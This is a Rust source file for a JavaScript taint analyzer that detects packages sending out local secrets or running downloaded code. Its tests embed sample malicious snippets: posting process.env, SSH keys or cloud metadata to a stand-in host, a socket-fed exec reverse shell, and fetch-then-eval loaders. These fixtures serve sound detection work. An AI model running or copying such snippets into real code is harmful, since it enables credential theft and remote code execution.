            let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
            v = union_all(&plains).union(&recv.plain());
            if !member {
                v = v.union(&callee_val.plain());
            } else if named("join") || named("concat") {
                v = v.with_built();
            }
        }
        // callbacks of anything but the script's functions get what the call
        // holds, and what it receives (a request's callbacks, only that)
        if fids.is_empty() {
            let mut held = if receiving { got.clone() } else { recv.plain() };
            for a in args.iter().filter(|_| !receiving) {
                held = held.union(&a.plain());
            }
            let cb = self.sc_callbacks(node, &held, scope);
            v = v.union(&cb.plain());
            // a runner given as the callback runs it: `.then(eval)`
            if held.tainted() {
                self.sc_runner_args(node, &held, scope);
            }
        }
        v = v.union(&got);
        // a container a value is put into holds it
        if member && (named("push") || named("unshift")) {
            let obj = self.a().at(callee, jt::A);
            if self.a().kind(obj) == Kind::Identifier {
                if let Some(b) = self.bind(obj, scope) {
                    if self.p.binds[b as usize].kind != BindKind::Import {
                        let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
                        self.write(b, union_all(&plains), false);
                    }
                }
            }
        }
        // what the call makes: a connection, a client; a connection's own
        // methods give it back
        let mut mark = 0u8;
        if makes_connection(&names) || (member && (named("request") || named("connect") || named("createConnection"))) {
            mark |= OBJ_CONN;
        }
        if makes_client(&names) {
            mark |= OBJ_CLIENT;
        }
        if member && recv.kind & OBJ_CONN != 0 && name.as_deref().is_some_and(|n| is_one(n, CONN_CHAIN)) {
            mark |= OBJ_CONN;
        }
        if mark != 0 {
            v = V { kind: v.kind | mark, ..v };
        }
        Ok(v)
    }

    /// supply mode: `new X(…)`: a connection (a socket, an XMLHttpRequest,
    /// a WebSocket), a Request (a send).
    pub(super) fn sc_new(&mut self, node: NodeId, args: &[V], spread: isize, scope: ScopeId) -> V {
        let callee = self.a().at(node, jt::A);
        let names = self.sc_names(callee, scope);
        let simple: Option<PyStr> = {
            let a = self.a();
            if a.is_ident(callee) {
                Some(a.name(callee).to_vec())
            } else if a.kind(callee) == Kind::MemberExpression {
                a.prop_name(callee)
            } else {
                None
            }
        };
        let is_named = |n: &str| simple.as_deref().is_some_and(|x| eq(x, n)) || names.iter().any(|x| eq(last_part(x), n));
        if is_named("Request") {
            self.sc_send(node, SEND1, args, spread, scope);
        }
        // received code: new Function(…, code), new Function.constructor(…),
        // new vm.Script(code)
        let at = self.a().0.nodes[node as usize].start;
        let ctor = {
            let a = self.a();
            a.kind(callee) == Kind::MemberExpression && a.prop_name(callee).is_some_and(|n| eq(&n, "constructor")) && {
                let obj = a.at(callee, jt::A);
                (a.kind(obj) == Kind::Identifier && is_one(a.name(obj), CONSTRUCTORS))
                    || (a.kind(obj) == Kind::MemberExpression && a.prop_name(obj).is_some_and(|n| eq(&n, "constructor")))
            }
        };
        if ctor || names.iter().any(|n| eq(n, "Function")) {
            self.sc_sink(RUN_CODE, &union_all(args), at);
        } else if names.iter().any(|n| is_one(n, &["vm.Script", "vm.SourceTextModule"])) {
            let v = if spread == 0 { union_all(args) } else { args.first().cloned().unwrap_or_else(V::empty) };
            self.sc_sink(RUN_CODE, &v, at);
        }
        let plains: Vec<V> = args.iter().map(|a| a.plain()).collect();
        let mut v = union_all(&plains);
        if is_named("Socket") || is_named("XMLHttpRequest") || is_named("WebSocket") || is_named("EventSource") {
            v = V { kind: v.kind | OBJ_CONN, ..v };
            // (what a socket, or a WebSocket or an event source the script
            // addresses, is sent is received; a browser's XMLHttpRequest is a
            // library's loader as often as not: jQuery's, CoffeeScript's)
            let own = if is_named("Socket") {
                true
            } else if is_named("WebSocket") || is_named("EventSource") {
                let first = self.a().list(node, jt::B).first().copied();
                match (first, args.first()) {
                    (Some(n), Some(a)) => (a.src && a.params.is_empty()) || !self.sc_from_caller(n, scope, 0),
                    _ => false,
                }
            } else {
                false
            };
            if own {
                let what = simple.clone().unwrap_or_else(|| u("a connection"));
                v = v.union(&self.sc_source(K_RECEIVED, what, at, self.a().line(node), 0));
            }
        }
        v
    }
}

// ---------------------------------------------------------------- the answer --

/// What the tree says about a text: the first send of local data (offset,
/// kind, what, whether only an address held it), none, or that it could
/// not say (the text follower answers).
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Answer {
    Found(usize, &'static str, PyStr, bool),
    Nothing,
    Unread,
}

/// The names that hold a path outside the package (core's `outside`, read
/// from the assignments of the module's bindings instead of a pattern for
/// assignments).
fn outside_names(prog: &Program, sup: &Supply) -> HashSet<PyStr> {
    let p = sup.p();
    let path_expr = p.re("_LD_PATH_EXPR_RE");
    let own_folder = p.re("_LD_OWN_FOLDER_RE");
    let fs_root = p.re("_LD_FS_ROOT_RE");
    let home = p.re("_LD_HOME_RE");
    let mut values: Vec<(PyStr, u32, u32)> = Vec::new();
    for b in &prog.binds {
        for w in &b.writes {
            if let Write::Init { node, path, .. } | Write::Assign { node, path, .. } = w {
                if path.is_empty() && b.module == 0 {
                    let n = &prog.mods[0].tree.nodes[*node as usize];
                    values.push((b.name.clone(), n.start, n.end));
                }
            }
        }
    }
    let mut outside: HashSet<PyStr> = HashSet::new();
    for (name, lo, hi) in &values {
        let value = pystr::strip(sup.span(*lo, *hi));
        if path_expr.match_(value).is_some()
            && own_folder.search(value).is_none()
            && (fs_root.match_(value).is_some() || home.search(value).is_some())
        {
            outside.insert(name.clone());
        }
    }
    for _ in 0..p.usize("_DD_PASSES") {
        if outside.is_empty() {
            break;
        }
        let mut grown = false;
        for (name, lo, hi) in &values {
            if outside.contains(name) {
                continue;
            }
            let value = sup.span(*lo, *hi);
            if path_expr.match_(pystr::lstrip(value)).is_some() && own_folder.search(value).is_none() {
                let uses = p.re("_LD_NAME_TOKEN_RE").finditer(value).any(|m| outside.contains(m.group0()));
                if uses {
                    outside.insert(name.clone());
                    grown = true;
                }
            }
        }
        if !grown {
            break;
        }
    }
    outside
}

/// What the tree says about a JavaScript text: its send of local data (the
/// strongest, `Found`, or `Nothing`), and its first received code (the
/// 1-based line and the category), if any.
#[derive(Clone, Debug)]
pub struct Facts {
    pub sent: Answer,
    pub received: Option<(usize, &'static str)>,
}

thread_local! {
    /// The last text read and what the tree said (None: it could not say):
    /// the tests ask for a text's send, then for its received code.
    static LAST: std::cell::RefCell<Option<(Vec<u32>, Option<Rc<Facts>>)>> = const { std::cell::RefCell::new(None) };
}

/// The tree's facts about a JavaScript text, or None when it could not say
/// (a text the parser doesn't read, over 2 MB, or past the pass's budget):
/// the text followers answer then.
pub fn facts(text: &[u32]) -> Option<Rc<Facts>> {
    if text.len() > MAX_FILE {
        return None;
    }
    if let Some(hit) = LAST.with(|l| l.borrow().as_ref().filter(|(t, _)| t.as_slice() == text).map(|(_, f)| f.clone())) {
        return hit;
    }
    let owned = text.to_vec();
    let got = crate::api::on_own_stack(move || facts_here(&owned)).map(Rc::new);
    LAST.with(|l| *l.borrow_mut() = Some((text.to_vec(), got.clone())));
    got
}

/// The strongest send of local data in a JavaScript text, read on its tree.
pub fn local_data_sent(text: &[u32]) -> Answer {
    match facts(text) {
        Some(f) => f.sent.clone(),
        None => Answer::Unread,
    }
}

/// The first received code in a JavaScript text, read on its tree: Some(the
/// line and category, or None), or None when the tree could not say.
pub fn received_code(text: &[u32]) -> Option<Option<(usize, &'static str)>> {
    facts(text).map(|f| f.received)
}

fn facts_here(text: &[u32]) -> Option<Facts> {
    let pack = crate::pack::current();
    let path = u("script.js");
    let tree = match crate::jsparse::parse_file(&path, text) {
        Ok(t) => t,
        // (TypeScript, which the hosts hand as JavaScript)
        Err(_) => match crate::jsparse::parse_file(&u("script.ts"), text) {
            Ok(t) => t,
            Err(_) => return None,
        },
    };
    let sup = Rc::new(Supply::new(pack, text));
    let mut cfg = Config::new(&[], &[], &[], &[]);
    cfg.supply = Some(sup.clone());
    let mut prog = Program::new(Rc::new(cfg));
    prog.add_module(&path, tree, 0);
    prog.resolve_module(0);
    let outside = outside_names(&prog, &sup);
    *sup.outside.borrow_mut() = outside;
    let mut findings: Vec<Out> = Vec::new();
    let notes = fixpoint(&mut prog, &mut findings);
    if notes.iter().any(|n| matches!(n, Out::Note { rule: "Q-FLOW-INCOMPLETE", .. })) {
        return None;
    }
    // the strongest send: data over what only an address holds, a harvest
    // over other data, then the first; the first received code
    let mut best: Option<((bool, bool, u32), &'static str, PyStr)> = None;
    let mut first: Option<(u32, &'static str)> = None;
    for f in findings {
        match f {
            Out::Send { at, kind, what, in_address: weak } => {
                let rank = (weak, weak || !harvest_of(sup.p(), kind, &what, &sup.whole), at);
                if best.as_ref().map_or(true, |(r, _, _)| rank < *r) {
                    best = Some((rank, kind, what));
                }
            }
            Out::Received { at, cat } => {
                if first.map_or(true, |(a, _)| at < a) {
                    first = Some((at, cat));
                }
            }
            _ => {}
        }
    }
    let sent = match best {
        Some(((weak, _, at), kind, what)) => Answer::Found(at as usize, kind, what, weak),
        None => Answer::Nothing,
    };
    let received = first.map(|(at, cat)| {
        let at = (at as usize).min(text.len());
        (text[..at].iter().filter(|&&c| c == 0x0A).count() + 1, cat)
    });
    Some(Facts { sent, received })
}

#[cfg(test)]
mod tests {
    use super::*;

    const HOST: &str = "collect.invalid";

    fn sent(src: &str) -> Option<(&'static str, String, bool)> {
        let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
        match facts_here(&text).map(|f| f.sent) {
            Some(Answer::Found(_at, kind, what, in_address)) => {
                Some((kind, what.iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect(), in_address))
            }
            Some(_) => None,
            None => panic!("not read: {}", src),
        }
    }

    fn found(kind: &'static str, what: &str) -> Option<(&'static str, String, bool)> {
        Some((kind, what.to_string(), false))
    }

    /// The category of a text's first received code, if any.
    fn runs(src: &str) -> Option<&'static str> {
        let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
        match facts_here(&text) {
            Some(f) => f.received.map(|(_, cat)| cat),
            None => panic!("not read: {}", src),
        }
    }

    #[test]
    fn the_environment_by_variable_and_whole() {
        let post = format!("fetch('https://{}/c', {{ method: 'POST', body: v }});\n", HOST);
        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN;\n{}", post)), found("environment", "NPM_TOKEN"));
        assert_eq!(sent(&format!("const v = JSON.stringify(process.env);\n{}", post)), found("environment", "the whole environment"));
        assert_eq!(sent(&format!("const v = {{ ...process.env }};\n{}", post)), found("environment", "the whole environment"));
        // a name read through destructuring is that variable
        assert_eq!(sent(&format!("const {{ USER: v }} = process.env;\n{}", post)), found("identity", "USER"));
        // a variable no client keeps secret is not local data
        assert_eq!(sent(&format!("const v = process.env.NODE_ENV;\n{}", post)), None);
        // a variable only in the address a client sends its key to
        assert_eq!(
            sent(&format!("fetch('https://{}/?k=' + process.env.API_KEY);\n", HOST)),
            Some(("environment", "API_KEY".to_string(), true))
        );
        // a local object named process is not the environment
        assert_eq!(sent(&format!("const process = {{ env: {{ TOKEN: 'x' }} }};\nconst v = process.env.TOKEN;\n{}", post)), None);
    }

    #[test]
    fn the_machine_through_functions_callbacks_and_closures() {
        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
        // the script's own function
        assert_eq!(
            sent(&format!("const os = require('os');\nfunction send(d) {{ {} }}\nsend(os.hostname());\n", post("d"))),
            found("identity", "hostname")
        );
        // an exec's callback writes a closure's variable, another callback sends it
        let src = format!(
            "const {{ exec }} = require('child_process');\nconst https = require('https');\nlet data = '';\n\
             exec('whoami', (e, out) => {{ data = out; }});\n\
             setTimeout(() => {{ https.request({{ hostname: '{}' }}).end(data); }}, 10);\n",
            HOST
        );
        assert_eq!(sent(&src), found("identity", "whoami"));
        // a member of this
        let src = format!(
            "const os = require('os');\nclass C {{\n  constructor() {{ this.data = os.hostname(); }}\n  \
             send() {{ {} }}\n}}\nnew C().send();\n",
            post("this.data")
        );
        assert_eq!(sent(&src), found("identity", "hostname"));
        // a name no declaration binds
        assert_eq!(sent(&format!("data = require('os').hostname();\n{}", post("data"))), found("identity", "hostname"));
        // a function of the os module given as a value
        let src = format!("const os = require('os');\nfunction tryGet(f) {{ return f(); }}\n{}", post("tryGet(os.hostname)"));
        assert_eq!(sent(&src), found("identity", "hostname"));
    }

    #[test]
    fn modules_under_other_names() {
        let src = format!("import os from 'os';\nimport axios from 'axios';\naxios.post('https://{}/c', {{ h: os.hostname() }});\n", HOST);
        assert_eq!(sent(&src), found("identity", "hostname"));
        // require kept under another name (model-providers 99.3.9's form)
        let src = format!(
            "const _req = module.require;\nconst os = _req('os');\nfetch('https://{}/c', {{ method: 'POST', body: os.hostname() }});\n",
            HOST
        );
        assert_eq!(sent(&src), found("identity", "hostname"));
        let src = format!("const r = require;\nconst o = r('os');\nfetch('https://{}/c', {{ method: 'POST', body: o.userInfo() }});\n", HOST);
        assert_eq!(sent(&src), found("identity", "userInfo"));
    }

    #[test]
    fn the_scripts_own_wrappers() {
        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
        // of exec, given a command line
        let src = format!(
            "const {{ execSync }} = require('child_process');\nfunction run(c) {{ try {{ return execSync(c).toString(); }} catch {{ return ''; }} }}\n{}",
            post("run('whoami')")
        );
        assert_eq!(sent(&src), found("identity", "whoami"));
        // of a read, given a folder outside the package (elf-stats' form)
        let src = format!(
            "const fs = require('fs');\nfunction dump(dir) {{ return fs.readdirSync(dir).map((f) => fs.readFileSync(dir + '/' + f, 'utf8')); }}\n{}",
            post("JSON.stringify(dump('/etc'))")
        );
        assert_eq!(sent(&src), found("file", "/etc"));
        // of the environment, given a name
        let src = format!("function getEnv(n) {{ return process.env[n]; }}\n{}", post("getEnv('AWS_SECRET_ACCESS_KEY')"));
        assert_eq!(sent(&src), found("environment", "AWS_SECRET_ACCESS_KEY"));
        let src = format!("function getEnv(n) {{ return process.env[n]; }}\n{}", post("getEnv('HOST')"));
        assert_eq!(sent(&src), None);
    }

    #[test]
    fn sends_by_what_makes_them() {
        // a connection, written in a callback
        let src = "const net = require('net');\nconst { execSync } = require('child_process');\nconst out = execSync('ps aux').toString();\n\
                   const c = net.connect(8058, '198.51.100.7', () => { c.write(out); });\n";
        assert_eq!(sent(src), found("report", "ps"));
        // a DNS lookup of a name composed with the data; not of the data alone
        let src = format!("const dns = require('dns');\nconst os = require('os');\ndns.resolve(os.hostname() + '.x.{}', () => {{}});\n", HOST);
        assert_eq!(sent(&src), found("identity", "hostname"));
        assert_eq!(sent("const dns = require('dns');\nconst os = require('os');\ndns.lookup(os.hostname(), () => {});\n"), None);
        // a host name built from the data is resolved: sent, whatever is done with it
        let src = format!("const os = require('os');\nconst u = 'https://' + os.hostname() + '.{}';\nprobe(u);\n", HOST);
        assert_eq!(sent(&src), found("identity", "hostname"));
        // a path joined to a fixed host is not a host name
        assert_eq!(sent("const os = require('os');\nprobe('http://x.example' + os.homedir());\n"), None);
        // a child process doesn't hold what it was given; a length is not the data
        let src = "const net = require('net');\nconst { spawn } = require('child_process');\nconst s = net.connect(1, 'h');\n\
                   const c = spawn('x', [], { env: process.env });\nc.stdout.pipe(s);\n";
        assert_eq!(sent(src), None);
        let src = format!("fetch('https://{}/c', {{ headers: {{ 'Content-Length': Buffer.byteLength(JSON.stringify(process.env)) }} }});\n", HOST);
        assert_eq!(sent(&src), None);
    }

    #[test]
    fn a_send_by_the_strongest_data_it_carries() {
        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
        // the instance's credentials after what whoami prints (psdimporter's form)
        let src = format!(
            "const {{ execSync }} = require('child_process');\nfunction run(c) {{ try {{ return execSync(c).toString(); }} catch {{ return ''; }} }}\n\
             const who = run('whoami');\nconst meta = run('curl -s http://169.254.169.254/latest/meta-data/');\n{}",
            post("`${who} ${meta}`")
        );
        assert_eq!(sent(&src), found("credentials", "the instance's metadata"));
        // a credential store after another file
        let src = format!(
            "const fs = require('fs');\nconst os = require('os');\nconst h = fs.readFileSync('/etc/hosts', 'utf8');\n\
             const k = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');\n{}",
            post("h + k")
        );
        assert_eq!(sent(&src), found("file", "os.homedir() + '/.ssh/id_rsa'"));
        // of two sends, the whole environment's after the host name's
        let src = format!("const os = require('os');\n{}{}", post("os.hostname()"), post("JSON.stringify(process.env)"));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        // otherwise the first read
        let src = format!("const fs = require('fs');\nconst os = require('os');\n{}", post("os.hostname() + fs.readFileSync('/etc/hosts')"));
        assert_eq!(sent(&src), found("identity", "hostname"));
    }

    #[test]
    fn code_it_receives_run_loaded_or_deserialized() {
        let url = format!("'https://{}/p.js'", HOST);
        // model-providers' form: require under another name, a response's
        // chunks gathered in a callback, Module's _compile
        let src = format!(
            "(() => {{\n  const _req = module.require;\n  const http = _req('http');\n  const Module = _req('module');\n\
             http.request({{ hostname: '{}', path: '/x.js' }}, res => {{\n    let code = '';\n\
             res.on('data', chunk => code += chunk);\n    res.on('end', () => {{\n      const m = new Module('x.js');\n\
             m._compile(code, 'x.js');\n    }});\n  }}).end();\n}})();\n",
            HOST
        );
        assert_eq!(runs(&src), Some("run"));
        // a response's text, through promises and the script's own runner
        assert_eq!(runs(&format!("fetch({}).then(r => r.text()).then(c => eval(c));\n", url)), Some("run"));
        assert_eq!(runs(&format!("function run(c) {{ return eval(c); }}\nfetch({}).then(r => r.text()).then(run);\n", url)), Some("run"));
        let src = format!("const axios = require('axios');\n(async () => {{ const {{ data }} = await axios.get({}); new Function(data)(); }})();\n", url);
        assert_eq!(runs(&src), Some("run"));
        let src = format!(
            "const https = require('https');\nconst vm = require('vm');\nhttps.get({}, (res) => {{ let b = ''; res.on('data', (d) => {{ b += d; }}); \
             res.on('end', () => vm.runInThisContext(b)); }});\n",
            url
        );
        assert_eq!(runs(&src), Some("run"));
        // what a download prints; what a socket is sent, run as a command
        let src = format!("const {{ execSync }} = require('child_process');\nconst u = {};\neval(execSync(`curl -s ${{u}}`).toString());\n", url);
        assert_eq!(runs(&src), Some("run"));
        let src = "const net = require('net');\nconst cp = require('child_process');\nconst s = net.connect(4444, '198.51.100.7');\n\
                   s.on('data', (d) => cp.exec(d.toString()));\n";
        assert_eq!(runs(src), Some("run"));
        // an interpreter given it as code
        let src = format!(
            "const {{ spawn }} = require('child_process');\nfetch({}).then(r => r.text()).then(b => spawn(process.execPath, ['-e', b]));\n",
            url
        );
        assert_eq!(runs(&src), Some("run"));
        // eval's other forms
        for call in ["(0, eval)(c)", "eval.call(null, c)", "global['ev' + 'al'](c)", "[].constructor.constructor(c)()"] {
            let src = format!("fetch({}).then(r => r.text()).then(c => {});\n", url, call);
            assert_eq!(runs(&src), Some("run"), "{}", call);
        }
        // a module it is told to load; data a deserializer runs
        let src = format!("const axios = require('axios');\naxios.get({}).then(({{ data }}) => require(data.plugin));\n", url);
        assert_eq!(runs(&src), Some("import"));
        assert_eq!(runs(&format!("fetch({}).then(r => r.text()).then(n => import(n));\n", url)), Some("import"));
        let src = format!("const s = require('node-serialize');\nfetch({}).then(r => r.text()).then(t => s.unserialize(t));\n", url);
        assert_eq!(runs(&src), Some("deserialize"));
        // a runner given as the callback; Function's constructor (chai-use-chain's form)
        assert_eq!(runs(&format!("fetch({}).then(r => r.text()).then(eval);\n", url)), Some("run"));
        let src = format!(
            "const axios = require('axios');\n(async () => {{ const s = (await axios.get({})).data.cookie; \
             const h = new Function.constructor('require', s); h(require); }})();\n",
            url
        );
        assert_eq!(runs(&src), Some("run"));
        // the script's own address: decoded, a fallback, a dead drop's, a socket's
        let src = format!("fetch(atob('{}')).then(r => r.text()).then(eval);\n", "aHR0cHM6Ly9jb2xsZWN0LmludmFsaWQvcC5qcw==");
        assert_eq!(runs(&src), Some("run"));
        let src = format!("const u = process.env.PAYLOAD_URL || {};\nfetch(u).then(r => r.text()).then(eval);\n", url);
        assert_eq!(runs(&src), Some("run"));
        let src = format!("fetch({}).then(r => r.text()).then(next => fetch(next)).then(r => r.text()).then(eval);\n", url);
        assert_eq!(runs(&src), Some("run"));
        let src = format!("const WebSocket = require('ws');\nconst ws = new WebSocket('wss://{}/c');\nws.on('message', (m) => eval(m.toString()));\n", HOST);
        assert_eq!(runs(&src), Some("run"));
        // names as one-string lists (what the decoded view of a string-array
        // obfuscation leaves: query-logger's form)
        let src = format!("module.exports = () => require('axios')[['post']]({}, {{ ...process.env }})[['then']](r => eval(r.data));\n", url);
        assert_eq!(runs(&src), Some("run"));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        // the script's own downloader, through other names; a variable of the
        // environment it stores it in; an exec its require is left out of
        let src = format!("const f0 = (u) => fetch(u);\nconst f1 = (u) => f0(u);\n(async () => {{ eval(await (await f1({})).text()); }})();\n", url);
        assert_eq!(runs(&src), Some("run"));
        let src = format!(
            "const axios = require('axios');\n(async () => {{ process.env['M'] = (await axios.get({})).data; require(process.env.M); }})();\n",
            url
        );
        assert_eq!(runs(&src), Some("import"));
        assert_eq!(runs(&format!("(async () => execSync(`node -e ${{await (await fetch({})).text()}}`))();\n", url)), Some("run"));
        // an interpreter given it as code on a command line
        let src = format!(
            "const {{ exec }} = require('child_process');\nfetch({}).then(r => r.text()).then(c => exec('node -e ' + JSON.stringify(c)));\n",
            url
        );
        assert_eq!(runs(&src), Some("run"));
        // none: a constant, a response only parsed or shown, a local file run
        assert_eq!(runs("eval('1 + 1');\n"), None);
        assert_eq!(runs(&format!("fetch({}).then(r => r.json()).then(d => console.log(JSON.parse(d)));\n", url)), None);
        assert_eq!(runs("const fs = require('fs');\neval(fs.readFileSync('x.js', 'utf8'));\n"), None);
        // none: a library's request for its caller (jQuery's script loader, CoffeeScript's)
        assert_eq!(runs("function load(url) { return fetch(url).then(r => r.text()).then(eval); }\nmodule.exports = load;\n"), None);
        let src = "function load(url) { const x = new XMLHttpRequest(); x.open('GET', url); \
                   x.onload = () => Function(x.responseText)(); x.send(); }\nload(document.currentScript.src);\n";
        assert_eq!(runs(src), None);
        // none: a fixed program given the data as its argument
        let src = format!(
            "const {{ exec }} = require('child_process');\nfetch({}).then(r => r.text()).then(ip => exec(`curl -s https://{}/?ip=${{ip}}`));\n",
            url, HOST
        );
        assert_eq!(runs(&src), None);
        let src = format!(
            "const {{ execSync }} = require('child_process');\nfetch({}).then(r => r.json()).then(j => {{ let cmd = `npm publish --registry=${{j.registry}}`; cmd += ' --access public'; execSync(cmd); }});\n",
            url
        );
        assert_eq!(runs(&src), None);
        // code in a string is not code
        assert_eq!(runs(&format!("const doc = `fetch({}).then(r => r.text()).then(eval)`;\n", url)), None);
    }

    #[test]
    fn commands_from_a_constant_list() {
        let send = format!("require('https').get('https://{}/?d=' + out);", HOST);
        // for-of
        let src = format!(
            "const {{ execSync }} = require('child_process');\nlet out = '';\nfor (const c of ['whoami', 'id']) {{ out += execSync(c).toString(); }}\n{}\n",
            send
        );
        assert_eq!(sent(&src), found("identity", "whoami"));
        // a callback given each (react-sdk-module-api's form)
        let src = format!(
            "const {{ exec }} = require('child_process');\nconst cmds = ['whoami', 'uname -a'];\ncmds.forEach((cmd) => {{ exec(cmd, (e, out) => {{ {} }}); }});\n",
            send
        );
        assert_eq!(sent(&src), found("identity", "whoami"));
        // an index into the list
        let src = format!(
            "const {{ execSync }} = require('child_process');\nconst cmds = ['whoami'];\nfor (let i = 0; i < cmds.length; i++) {{ const out = execSync(cmds[i]).toString(); {} }}\n",
            send
        );
        assert_eq!(sent(&src), found("identity", "whoami"));
    }

    #[test]
    fn evasions_of_the_text_follower() {
        let post = format!("fetch('https://{}/x', {{method: 'POST', body: JSON.stringify(process.env)}});\n", HOST);
        // a quote in a regular expression begins no string
        assert_eq!(sent(&format!("const q = /'/g; {}", post)), found("environment", "the whole environment"));
        // padding before the payload: no window, no cap on assignments
        let mut src = String::from("const v = JSON.stringify(process.env);\n");
        for k in 0..6000 {
            src.push_str(&format!("var a{} = {};\n", k, k));
        }
        src.push_str(&format!("fetch('https://{}/x', {{method: 'POST', body: v}});\n", HOST));
        assert_eq!(sent(&src), found("environment", "the whole environment"));
        // code in a string is not code
        let src = format!("const doc = `fetch('https://{}/x', {{body: JSON.stringify(process.env)}})`;\n", HOST);
        assert_eq!(sent(&src), None);
    }
}
